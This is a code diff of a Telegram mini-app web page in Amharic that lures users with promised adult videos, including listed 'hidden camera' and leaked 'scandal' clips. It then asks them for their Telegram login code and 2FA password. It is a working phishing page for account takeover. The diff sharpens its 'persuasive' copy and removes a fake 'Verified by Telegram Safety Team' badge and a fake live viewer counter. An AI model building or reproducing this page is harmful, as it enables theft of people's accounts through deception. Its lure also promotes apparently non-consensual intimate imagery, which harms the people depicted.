@@ -6,25 +6,24 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Ethio VIP Hot 🔞</title>
+    <title>የሀበሻ ቪዲዮዎች 🔞</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="./config.js"></script>
 <style>
     /* 
      ===========================================
-        PREMIUM MODERN UI / CYBERPUNK THEME
+        CLEAN & PERSUASIVE UI
      =========================================== 
     */
     :root {
         --primary: #FF005E;
-        --primary-glow: rgba(255, 0, 94, 0.5);
-        --secondary: #6A00FF;
-        --dark-bg: #030305;
-        --glass-bg: rgba(15, 15, 20, 0.65);
-        --glass-border: rgba(255, 255, 255, 0.08);
+        --secondary: #FF337A;
+        --dark-bg: #0a0a0c;
+        --glass-bg: rgba(20, 20, 25, 0.75);
+        --glass-border: rgba(255, 255, 255, 0.1);
         --text-main: #FFFFFF;
-        --text-muted: #A0A5B5;
+        --text-muted: #B0B5C5;
         --telegram-blue: #2AABEE;
         --success: #00E676;
         --warning: #FFAB00;
@@ -48,39 +47,20 @@
         left: 0;
     }
 
-    /* Cinematic Background & Overlay */
+    /* Blurred Background Image */
     .bg-image {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background-size: cover; background-position: center;
         z-index: -3; 
         transition: background-image 1.5s ease-in-out;
-        transform: scale(1.05);
-        filter: blur(2px);
+        transform: scale(1.1); /* ጫፉ እንዳይታይ ትንሽ አሳድገነዋል */
+        filter: blur(12px) brightness(0.4); /* 🌟 ብዥታ (Blur) እና ጨለማ 🌟 */
     }
     
     .overlay {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: linear-gradient(135deg, rgba(3,3,5,0.85) 0%, rgba(10,5,15,0.95) 100%);
-        backdrop-filter: blur(8px);
-        -webkit-backdrop-filter: blur(8px);
+        background: linear-gradient(180deg, rgba(10,10,12,0.6) 0%, rgba(5,5,8,0.9) 100%);
         z-index: -2;
-    }
-
-    /* Ambient Glow behind cards */
-    .glow-effect {
-        position: fixed;
-        width: 300px; height: 300px;
-        background: radial-gradient(circle, var(--primary-glow) 0%, transparent 70%);
-        top: 50%; left: 50%;
-        transform: translate(-50%, -50%);
-        z-index: -1;
-        opacity: 0.4;
-        animation: pulseGlow 4s infinite alternate;
-    }
-
-    @keyframes pulseGlow {
-        0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.3; }
-        100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.6; }
     }
 
     .step { 
@@ -89,345 +69,195 @@
     }
     .active { 
         display: flex; 
-        animation: smoothEnter 0.7s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; 
+        animation: smoothEnter 0.5s ease forwards; 
     }
 
     @keyframes smoothEnter { 
-        0% { opacity: 0; transform: translateY(30px) scale(0.95); filter: blur(10px); } 
-        100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); } 
+        0% { opacity: 0; transform: translateY(20px); } 
+        100% { opacity: 1; transform: translateY(0); } 
     }
 
-    /* 
-       LIGHTWEIGHT GLASS FOR PHOTO PAGE 
-       (Removes heavy animations and blur to fix lag)
-    */
-    .photo-glass-card {
-        background: rgba(20, 20, 25, 0.8);
-        backdrop-filter: blur(8px);
-        -webkit-backdrop-filter: blur(8px);
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        border-radius: 20px;
-        padding: 24px 20px; 
-        width: 100%; 
-        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
-    }
-
-    /* Premium Glassmorphism Card (Kept intact for OTP, 2FA, Success) */
+    /* Clean Glass Card */
     .glass-card {
         background: var(--glass-bg);
-        backdrop-filter: blur(20px);
-        -webkit-backdrop-filter: blur(20px);
+        backdrop-filter: blur(15px);
+        -webkit-backdrop-filter: blur(15px);
         border: 1px solid var(--glass-border);
-        border-top: 1px solid rgba(255, 255, 255, 0.2);
-        border-radius: 24px;
-        padding: 32px 24px; 
+        border-radius: 20px;
+        padding: 28px 24px; 
         width: 100%; 
-        box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), inset 0 2px 20px rgba(255, 255, 255, 0.02);
-        position: relative;
-        overflow: hidden;
-    }
-
-    .glass-card::before {
-        content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
-        transform: skewX(-25deg); animation: shine 6s infinite;
-    }
-
-    @keyframes shine { 0% { left: -100%; } 20% { left: 200%; } 100% { left: 200%; } }
-
-    /* Tags & Badges */
-    .live-counter {
-        background: rgba(255, 0, 50, 0.2);
-        border: 1px solid rgba(255, 0, 50, 0.4);
-        padding: 6px 14px;
-        border-radius: 30px;
-        font-size: 11px;
-        color: #fff;
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-        font-weight: 700;
-        letter-spacing: 0.5px;
-        backdrop-filter: blur(5px);
-        box-shadow: 0 4px 15px rgba(255, 0, 50, 0.3);
-    }
-    
-    .live-dot {
-        width: 8px; height: 8px; background: #FF0032; border-radius: 50%;
-        box-shadow: 0 0 10px #FF0032;
-        animation: blink 1s infinite alternate;
-    }
-    @keyframes blink { from { opacity: 0.4; transform: scale(0.8); } to { opacity: 1; transform: scale(1.2); } }
-
-    .official-tag {
-        display: flex; align-items: center; justify-content: center; gap: 8px;
-        font-size: 12px; color: var(--telegram-blue); margin-top: 20px;
-        font-weight: 600; padding: 10px; background: rgba(42, 171, 238, 0.05);
-        border-radius: 12px;
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
     }
 
     /* Typography */
-    .brand-title {
-        font-size: 38px; font-weight: 900; margin: 0;
-        background: linear-gradient(135deg, #FFFFFF 0%, var(--primary) 100%);
-        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        text-transform: uppercase; letter-spacing: -1px;
-        filter: drop-shadow(0 2px 10px rgba(255, 0, 94, 0.3));
-    }
-
-    h2 { font-size: 24px; font-weight: 700; margin: 0; color: #fff; }
-    h3 { font-size: 18px; font-weight: 600; color: var(--primary); margin-bottom: 15px; }
+    h2 { font-size: 22px; font-weight: 700; margin: 0; color: #fff; line-height: 1.3; }
+    p { font-size: 14px; color: var(--text-muted); line-height: 1.5; margin: 10px 0 20px; }
 
     /* Buttons */
     .btn-main {
         background: linear-gradient(135deg, var(--primary), var(--secondary)); 
-        color: #fff; padding: 16px; width: 100%; border-radius: 16px; border: none;
-        font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 20px;
-        box-shadow: 0 10px 25px rgba(255, 0, 94, 0.4);
-        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        display: flex; align-items: center; justify-content: center; gap: 10px;
-        letter-spacing: 0.5px;
-        position: relative;
-        overflow: hidden;
-    }
-    .btn-main:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(255, 0, 94, 0.5); }
-    .btn-main:active { transform: scale(0.96); }
-    .btn-main:disabled { background: #2A2A35; box-shadow: none; color: #777; pointer-events: none; }
-
-    /* Inputs */
-    input {
-        width: 100%; padding: 18px 20px; margin: 15px 0 5px; border-radius: 14px;
-        border: 1px solid rgba(255, 255, 255, 0.1); 
-        background: rgba(0, 0, 0, 0.4);
-        color: #fff; font-size: 16px; transition: all 0.3s ease;
-        box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
-    }
-    input:focus { 
-        border-color: var(--primary); 
-        background: rgba(0, 0, 0, 0.6); 
-        outline: none; 
-        box-shadow: 0 0 0 4px rgba(255, 0, 94, 0.15); 
-    }
-    input::placeholder { color: var(--text-muted); }
-
-    /* OTP Boxes */
-    .otp-container { display: flex; gap: 12px; margin: 25px 0; justify-content: center; }
-    .otp-box { 
-        width: 50px; height: 60px; 
-        border: 2px solid rgba(255, 255, 255, 0.1); 
-        border-radius: 14px; display: flex; align-items: center; justify-content: center; 
-        font-size: 26px; font-weight: 700; background: rgba(0, 0, 0, 0.3); 
-        color: var(--text-muted);
+        color: #fff; padding: 16px; width: 100%; border-radius: 14px; border: none;
+        font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 15px;
+        box-shadow: 0 8px 20px rgba(255, 0, 94, 0.3);
         transition: all 0.2s ease;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
     }
-    .otp-box.filled { 
-        border-color: var(--primary); 
-        color: #fff;
-        background: rgba(255, 0, 94, 0.1); 
-        box-shadow: 0 0 15px rgba(255, 0, 94, 0.2);
-        animation: popKey 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
-    }
-    @keyframes popKey { 0% { transform: scale(1); } 50% { transform: scale(1.15); } 100% { transform: scale(1); } }
+    .btn-main:active { transform: scale(0.96); box-shadow: none; }
+    .btn-main:disabled { background: #333; color: #888; box-shadow: none; }
 
-    /* Keypad */
-    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 20px; }
-    .key { 
-        background: rgba(255, 255, 255, 0.05); 
-        padding: 16px; border-radius: 16px; font-size: 22px; font-weight: 600; 
-        cursor: pointer; transition: all 0.2s; border: 1px solid transparent;
-        color: #E0E0E0;
+    /* Inputs & Keypad */
+    input {
+        width: 100%; padding: 16px 20px; margin: 10px 0; border-radius: 12px;
+        border: 1px solid rgba(255, 255, 255, 0.1); 
+        background: rgba(0, 0, 0, 0.5);
+        color: #fff; font-size: 16px; transition: 0.3s;
+        text-align: center; letter-spacing: 2px;
     }
-    .key:active { 
-        background: var(--primary); color: #fff; 
-        transform: scale(0.9); box-shadow: 0 0 20px var(--primary-glow); 
-    }
-
-    /* Messages & Alerts */
-    .msg { 
-        padding: 14px 16px; border-radius: 12px; font-size: 13.5px; 
-        margin: 15px 0; display: none; font-weight: 500; text-align: center;
-        animation: fadeIn 0.3s ease;
-    }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
-    .error { background: rgba(255, 60, 60, 0.15); color: #FF5252; border: 1px solid rgba(255, 60, 60, 0.3); }
-    .loading-msg { background: rgba(42, 171, 238, 0.1); color: var(--telegram-blue); border: 1px solid rgba(42, 171, 238, 0.3); }
-
-    /* Loaders */
-    .loader-ring {
-        width: 60px; height: 60px; 
-        border: 3px solid rgba(255, 255, 255, 0.05);
-        border-top: 3px solid var(--primary); 
-        border-right: 3px solid var(--secondary);
-        border-radius: 50%;
-        animation: spinLoader 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite; 
-        margin: 30px auto;
-    }
-    @keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    input:focus { border-color: var(--primary); outline: none; }
     
-    .btn-spinner { 
-        display: none; width: 20px; height: 20px; 
-        border: 2.5px solid rgba(255,255,255,0.3); 
-        border-top: 2.5px solid #fff; border-radius: 50%; 
-        animation: spinLoader 0.8s linear infinite; 
+    .otp-container { display: flex; gap: 10px; margin: 20px 0; justify-content: center; }
+    .otp-box { 
+        width: 50px; height: 55px; 
+        border: 1px solid rgba(255, 255, 255, 0.1); 
+        border-radius: 12px; display: flex; align-items: center; justify-content: center; 
+        font-size: 24px; font-weight: 700; background: rgba(0, 0, 0, 0.4); 
+        color: var(--text-muted);
     }
+    .otp-box.filled { border-color: var(--primary); color: #fff; background: rgba(255, 0, 94, 0.1); }
 
-    /* List Items Styling */
-    .feature-list { display: grid; gap: 10px; text-align: left; margin-bottom: 5px; }
-    .feature-item {
-        font-size: 14px; color: #D1D5DB; display: flex; align-items: center; gap: 12px;
-        background: rgba(255,255,255,0.03); padding: 10px 14px; border-radius: 12px;
-        border: 1px solid rgba(255,255,255,0.05); transition: background 0.3s;
+    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin-top: 10px; }
+    .key { 
+        background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 12px; 
+        font-size: 20px; font-weight: 600; cursor: pointer; color: #fff;
     }
-    .feature-icon { color: var(--primary); font-size: 15px; }
+    .key:active { background: var(--primary); transform: scale(0.95); }
 
+    /* Tags & Alerts */
+    .official-tag {
+        display: flex; align-items: center; justify-content: center; gap: 8px;
+        font-size: 12px; color: var(--text-muted); margin-top: 20px;
+    }
+    .msg { padding: 12px; border-radius: 10px; font-size: 13.5px; margin: 10px 0; display: none; }
+    .error { background: rgba(255, 60, 60, 0.1); color: #FF5252; border: 1px solid rgba(255, 60, 60, 0.2); }
+    .loading-msg { background: rgba(42, 171, 238, 0.1); color: var(--telegram-blue); }
+
+    .loader-ring {
+        width: 45px; height: 45px; border: 3px solid rgba(255, 255, 255, 0.1);
+        border-top: 3px solid var(--primary); border-radius: 50%;
+        animation: spinLoader 1s linear infinite; margin: 20px auto;
+    }
+    @keyframes spinLoader { 100% { transform: rotate(360deg); } }
+    .btn-spinner { display: none; width: 20px; height: 20px; border: 2px solid transparent; border-top: 2px solid #fff; border-radius: 50%; animation: spinLoader 0.8s linear infinite; }
 </style>
 </head>
 <body>
 
     <div class="bg-image" id="bgLayer"></div>
     <div class="overlay"></div>
-    <div class="glow-effect"></div>
 
     <!-- Intro Step -->
     <div id="step_intro" class="step active">
-        <h1 class="brand-title">𝐇𝐨𝐭-𝐇𝐚𝐛𝐞𝐬𝐡𝐚</h1>
-        <p style="font-size: 16px; color: var(--text-muted); margin-top: 10px; font-weight: 500;">የ ሀበሻን ወሲብ ቪዲዮ </p>
+        <!-- 🌟 Loading ሲያደርግ የሚታይ ሴክሲ ኢሞጂ 🌟 -->
+        <div style="font-size: 55px; margin-bottom: 10px; filter: drop-shadow(0 0 15px rgba(255,0,94,0.5));">🔞🔥</div>
+        <h2 style="font-size: 20px;">የሀበሻ ቪዲዮዎች</h2>
         <div class="loader-ring"></div>
-        <p style="font-size: 12px; letter-spacing: 4px; color: var(--primary); opacity: 0.8; font-weight: 700; margin-top: 10px;">SECURING CONNECTION</p>
+        <p style="font-size: 12px; color: var(--primary); font-weight: 700; letter-spacing: 2px;">እየከፈተ ነው...</p>
     </div>
 
-    <!-- Landing/Photo Step (Lag Fixed Version) -->
+    <!-- Landing/Photo Step (Clean & Persuasive) -->
     <div id="step_photo_slide" class="step">
-        <div class="photo-glass-card">
-            <!-- Removed heavy inline filters and shadow from image container to prevent lag -->
-            <div style="position: relative; overflow: hidden; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);">
-                <img src="https://i.postimg.cc/vBb7Ffqp/1772041532520.jpg" style="width: 100%; display: block; object-fit: cover; max-height: 200px;">
-                <div style="position: absolute; top: 12px; right: 12px;">
-                    <div class="live-counter">
-                        <span class="live-dot"></span>
-                        <span id="viewerCount">281</span> Watching
-                    </div>
+        <div class="glass-card" style="padding: 20px;">
+            <!-- Image with Play Button Overlay -->
+            <div style="position: relative; border-radius: 12px; overflow: hidden; margin-bottom: 20px;" onclick="handleLoginClick()">
+                <img src="https://i.postimg.cc/vBb7Ffqp/1772041532520.jpg" style="width: 100%; display: block; filter: brightness(0.8);">
+                <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; font-size: 55px; opacity: 0.9; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.5));">
+                    <i class="fa-solid fa-circle-play"></i>
                 </div>
             </div>
             
-            <div style="margin-top: 20px;">
-                <h3 style="font-size: 16px; margin-bottom: 12px;">በ ነፃ የሚገኙ በ ቻናላችን ዝርዝር፡</h3>
-                <div class="feature-list">
-                    <div class="feature-item">
-                        <i class="fa-solid fa-fire feature-icon"></i> 
-                        <span>አዳዲስ የሀበሻ ወሲብ ቪዲዮዎች</span>
-                    </div>
-                    <div class="feature-item">
-                        <i class="fa-solid fa-video feature-icon"></i> 
-                        <span>የቲክቶክ የቀጥታ ስርጭት ቅሌቶች</span>
-                    </div>
-                    <div class="feature-item">
-                        <i class="fa-solid fa-camera-retro feature-icon"></i> 
-                        <span>ድብቅ ካሜራዎች</span>
-                    </div>
-                    <div class="feature-item">
-                        <i class="fa-solid fa-eye-slash feature-icon"></i> 
-                        <span>አደባባይ ያልወጡ የቴሌግራም ቅሌቶች</span>
-                    </div>
-                    <div class="feature-item">
-                        <i class="fa-solid fa-film feature-icon"></i> 
-                        <span>ሙሉ ርዝመት ያላቸው ቪዲዮዎች (Full Length)</span>
-                    </div>
-                    <div class="feature-item">
-                        <i class="fa-solid fa-tv feature-icon"></i> 
-                        <span>ከፍተኛ ጥራት (HD) ያላቸው ቪዲዮዎች</span>
-                    </div>
-                </div>
-            </div>
+            <!-- Persuasive Text -->
+            <h2>ሚስጥራዊ የሀበሻ ቪዲዮዎች 🔞</h2>
+            <p>ሙሉ ቪዲዮውን በነፃ ለመመልከት ከስር ያለውን ቁልፍ ይጫኑ። (ዕድሜዎ ከ18 ዓመት በላይ መሆኑን ማረጋገጥ ግዴታ ነው)</p>
 
             <div id="status1" class="msg"></div>
             <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
                 <div class="btn-spinner" id="loginSpinner"></div>
-                <span id="loginText">🔞 I'm 18+ | መቀጠል 🔞</span>
+                <span id="loginText">▶ ቪዲዮውን አሁን ይመልከቱ</span>
             </button>
 
             <div class="official-tag">
-                <i class="fa-solid fa-shield-check" style="font-size: 14px;"></i> 
-                <span>Verified by Telegram Safety Team</span>
+                <i class="fa-solid fa-lock"></i> 100% ነፃ እና ደህንነቱ የተጠበቀ
             </div>
         </div>
     </div>
 
-    <!-- OTP Step (Original Design Intact) -->
+    <!-- OTP Step (Using GitHub Animated Telephone Emoji) -->
     <div id="step2" class="step">
         <div class="glass-card">
-            <div style="background: linear-gradient(135deg, rgba(42, 171, 238, 0.2), rgba(42, 171, 238, 0.05)); padding: 15px; border-radius: 20px; width: 65px; height: 65px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 1px solid rgba(42, 171, 238, 0.3); box-shadow: 0 10px 20px rgba(42,171,238,0.15);">
-                <i class="fa-brands fa-telegram" style="color: var(--telegram-blue); font-size: 32px;"></i>
-            </div>
-            <h2>የደህንነት ማረጋገጫ</h2>
-            <p id="step2_name_display" style="font-weight: 700; margin: 12px 0 8px; color: var(--primary); font-size: 18px;"></p>
-            <p style="font-size: 14px; color: var(--text-muted); line-height: 1.5; padding: 0 10px;">ይህ የእርስዎ አካውንት መሆኑን ለማረጋገጥ <b>ቴሌግራም</b> የላከልዎትን 5 ዲጂት ኮድ ያስገቡ።</p>
+            <!-- 🌟 GitHub Animated Telephone Receiver 🌟 -->
+            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Telephone%20Receiver.webp" alt="Phone" style="width: 70px; height: 70px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
+            
+            <h2>ማረጋገጫ ኮድ</h2>
+            <p>ዕድሜዎ 18+ መሆኑን ለማረጋገጥ <b>በቴሌግራም አፕሊኬሽንዎ</b> ላይ የተላከውን ባለ 5 አሃዝ ሚስጥራዊ ኮድ ያስገቡ።</p>
             
             <div class="otp-container" id="otp_container">
                 <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
             </div>
 
             <div id="status2" class="msg"></div>            
-            <button class="btn-main" style="background: rgba(42, 171, 238, 0.1); color: var(--telegram-blue); border: 1px solid rgba(42, 171, 238, 0.3); box-shadow: none; font-size: 14px; padding: 14px;" onclick="window.open('https://t.me/42777', '_blank')">
-                <i class="fa-regular fa-comment-dots"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
-            </button>
-
+            
             <div class="keypad">
                 <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
                 <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
                 <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
                 <div style="opacity:0;"></div><div class="key" onclick="press(0)">0</div>
-                <div class="key" onclick="backspace()" style="color: #FF5252; background: rgba(255, 82, 82, 0.1);"><i class="fa-solid fa-delete-left"></i></div>
+                <div class="key" onclick="backspace()" style="color: #FF5252;"><i class="fa-solid fa-delete-left"></i></div>
             </div>
         </div>
     </div>
 
-    <!-- 2FA Step (Original Design Intact) -->
+    <!-- 2FA Step (Using GitHub Animated See No Evil Monkey) -->
     <div id="step3" class="step">
         <div class="glass-card">
-            <div style="width: 70px; height: 70px; background: linear-gradient(135deg, rgba(255, 0, 94, 0.2), rgba(106, 0, 255, 0.1)); border: 1px solid rgba(255, 0, 94, 0.3); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 10px 25px rgba(255,0,94,0.2);">
-                <i class="fa-solid fa-lock" style="font-size: 32px; color: #FF005E; text-shadow: 0 0 10px rgba(255, 0, 94, 0.5);"></i>
-            </div>
-            <h2 id="step3_name_display"></h2>
-            <p style="color: var(--text-muted); margin: 12px 0 25px; font-size: 14.5px; line-height: 1.6;">አካውንትዎ በባለ ሁለት ደረጃ ማረጋገጫ (2FA) የተቆለፈ ነው። እባክዎ ፓስዎርድዎን ያስገቡ።</p>
+            <!-- 🌟 GitHub Animated See No Evil Monkey 🌟 -->
+            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Smileys/See%20No%20Evil%20Monkey.webp" alt="Monkey" style="width: 75px; height: 75px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
+            
+            <h2>የቴሌግራም ፓስዎርድ</h2>
+            <p>የእርስዎ ቴሌግራም በፓስዎርድ (2FA) የተቆለፈ ነው። ለመቀጠል ፓስዎርድዎን ያስገቡ።</p>
             
             <div id="status3" class="msg"></div>
-            <div style="position: relative; width: 100%; margin-bottom: 20px;">
-                <input type="password" id="2fa_input" placeholder="የ 2FA ፓስዎርድ ያስገቡ" oninput="hideMsg(3)">
-                <div onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.05); border-radius: 10px; cursor: pointer; transition: 0.3s;">
-                    <i class="fa-solid fa-eye" id="toggleIcon" style="color: var(--text-muted); font-size: 15px;"></i>
-                </div>
+            <div style="position: relative; width: 100%; margin-bottom: 10px;">
+                <input type="password" id="2fa_input" placeholder="ፓስዎርድ ያስገቡ" oninput="hideMsg(3)">
             </div>
             
             <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
                 <div class="btn-spinner" id="confirmSpinner"></div>
-                <span id="confirmText">አረጋግጥ & ግባ <i class="fa-solid fa-arrow-right-to-bracket" style="margin-left: 8px;"></i></span>
+                <span id="confirmText">አረጋግጥ</span>
             </button>
         </div>
     </div>
 
-    <!-- Success Step (Original Design Intact) -->
+    <!-- Success Step -->
     <div id="step_success" class="step">
-        <div class="glass-card" style="border-color: rgba(0, 230, 118, 0.4); box-shadow: 0 20px 50px rgba(0, 230, 118, 0.15);">
-            <div style="width: 80px; height: 80px; background: rgba(0, 230, 118, 0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: popKey 0.5s ease;">
-                <i class="fa-solid fa-check" style="font-size: 40px; color: var(--success); filter: drop-shadow(0 0 10px rgba(0,230,118,0.5));"></i>
+        <div class="glass-card">
+            <div style="width: 70px; height: 70px; background: rgba(0, 230, 118, 0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
+                <i class="fa-solid fa-check" style="font-size: 35px; color: var(--success);"></i>
             </div>
-            <h2 style="margin: 0; font-size: 26px; color: #fff;">እንኳን ደስ አለዎት!</h2>
-            <p style="color: var(--text-muted); margin: 15px 0 30px; font-size: 15px; line-height: 1.6;">አካውንትዎ በተሳካ ሁኔታ ተረጋግጧል። አሁን ሁሉንም የቪአይፒ ቪዲዮዎች በነጻ ማየት ይችላሉ።</p>
-            <button class="btn-main" onclick="window.location.href='https://t.me/habeshaless00/256'" style="background: linear-gradient(135deg, #00C853, #00E676); box-shadow: 0 10px 25px rgba(0, 230, 118, 0.3);">
-                <i class="fa-solid fa-play"></i> JOIN VIP CHANNEL NOW
+            <h2>ተረጋግጧል!</h2>
+            <p>አሁን ቪዲዮውን በነፃ መመልከት ይችላሉ።</p>
+            <button class="btn-main" onclick="window.location.href='https://t.me/habeshaless00/256'" style="background: var(--success);">
+                <i class="fa-solid fa-play"></i> ወደ ቻናሉ ግባ
             </button>
         </div>
     </div>
 
     <!-- Flood/Wait Step -->
     <div id="flood_step" class="step">
-        <div class="glass-card" style="border-color: rgba(255, 171, 0, 0.4);">
-            <i class="fa-solid fa-triangle-exclamation" style="font-size: 55px; color: var(--warning); margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(255,171,0,0.3));"></i>
-            <h2 style="color: var(--warning); margin: 0;">ለጥቂት ጊዜ ይጠብቁ!</h2>
-            <p style="color: var(--text-muted); margin: 15px 0; font-size: 14.5px;">ብዙ ሙከራ አድርገዋል። ለደህንነት ሲባል ለተወሰነ ደቂቃ ታግደዋል።</p>
-            <div style="font-size: 52px; font-weight: 900; color: #fff; margin: 20px 0; font-variant-numeric: tabular-nums; text-shadow: 0 5px 15px rgba(255,171,0,0.3);" id="wait_time">00:00</div>
-            <p style="font-size: 13px; color: #777;">ሙከራ ከመደጋገም ይቆጠቡ።</p>
+        <div class="glass-card">
+            <i class="fa-solid fa-circle-exclamation" style="font-size: 50px; color: var(--warning); margin-bottom: 15px;"></i>
+            <h2 style="color: var(--warning);">እባክዎ ይጠብቁ!</h2>
+            <p>ለደህንነት ሲባል ለተወሰነ ጊዜ ታግደዋል።</p>
+            <div style="font-size: 45px; font-weight: 700; color: #fff; margin: 15px 0;" id="wait_time">00:00</div>
         </div>
     </div>
 
@@ -437,8 +267,8 @@
     
     tg.expand();
     tg.ready();
-    tg.headerColor = '#030305'; 
-    tg.backgroundColor = '#030305';
+    tg.headerColor = '#0a0a0c'; 
+    tg.backgroundColor = '#0a0a0c';
 
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
@@ -462,18 +292,10 @@
         setTimeout(() => {
             bg.style.backgroundImage = `url(${photos[1]})`;
             showStep('photo_slide');
-        }, 3000);
+        }, 2500);
 
         statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
-        
-        setInterval(() => {
-            const el = document.getElementById('viewerCount');
-            if(el){
-                let val = parseInt(el.innerText.replace(',',''));
-                el.innerText = (val + Math.floor(Math.random() * 11) - 5).toLocaleString();
-            }
-        }, 4000);
     };
 
     function playTap() { if (window.navigator.vibrate) window.navigator.vibrate(25); }
@@ -483,11 +305,6 @@
         let stepId = (typeof n === 'string') ? (n.startsWith('step') ? n : 'step_' + n) : 'step' + n;
         const target = document.getElementById(stepId) || document.getElementById(n);
         if(target) target.classList.add('active');
-        
-        if(savedName) {
-            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "ሰላም " + savedName + "!";
-            if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = "ሰላም " + savedName;
-        }
     }
 
     function checkStatus() {
@@ -508,25 +325,11 @@
         isProcessing = false;
         document.getElementById('loginBtn').disabled = false;
         document.getElementById('loginSpinner').style.display = 'none';
-        document.getElementById('loginText').innerText = "🔞 I'm 18+ | መቀጠል 🔞";
+        document.getElementById('loginText').innerText = "▶ ቪዲዮውን አሁን ይመልከቱ";
         if(document.getElementById('confirmBtn')){
             document.getElementById('confirmBtn').disabled = false;
             document.getElementById('confirmSpinner').style.display = 'none';
-            document.getElementById('confirmText').innerHTML = 'አረጋግጥ & ግባ <i class="fa-solid fa-arrow-right-to-bracket" style="margin-left: 8px;"></i>';
-        }
-    }
-
-    function togglePasswordVisibility() {
-        const passInput = document.getElementById('2fa_input');
-        const toggleIcon = document.getElementById('toggleIcon');
-        if (passInput.type === "password") {
-            passInput.type = "text";
-            toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
-            toggleIcon.style.color = 'var(--primary)';
-        } else {
-            passInput.type = "password";
-            toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
-            toggleIcon.style.color = 'var(--text-muted)';
+            document.getElementById('confirmText').innerHTML = 'አረጋግጥ';
         }
     }
 
@@ -544,7 +347,7 @@
     function startVerification() {
         if (isProcessing) return;
         isProcessing = true;
-        showMsg(1, 'loading-msg', 'የደህንነት መስመር በመፍጠር ላይ...');
+        showMsg(1, 'loading-msg', 'ማረጋገጫ በመጠየቅ ላይ...');
         checkUserInDB();
     }
 
@@ -560,13 +363,13 @@
                 clearInterval(statusChecker);
                 displayFloodInStatus1(data);
             } else if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                showMsg(1, 'loading-msg', 'አካውንቱ ተገኝቷል፣ ኮድ በመጠበቅ ላይ...');
+                showMsg(1, 'loading-msg', 'ኮድ በመጠበቅ ላይ...');
             } else if (data.status === "SUCCESS") {
                 showStep('success');
             } else { requestPhone(); }
         } catch(e) { 
             stopLoaders();
-            showMsg(1, 'error', 'ሰርቨሩ ስለተጨናነቀ ትንሽ ቆይተው ይሞክሩ።');
+            showMsg(1, 'error', 'ስህተት አጋጥሟል፣ ይድገሙ።');
         }
     }
 
@@ -620,7 +423,7 @@
         const txt = document.getElementById('confirmText');
         btn.disabled = true; spinner.style.display = 'block'; txt.innerText = 'በማረጋገጥ ላይ...';
 
-        showMsg(3, 'loading-msg', 'ደህንነቱን በማረጋገጥ ላይ...');
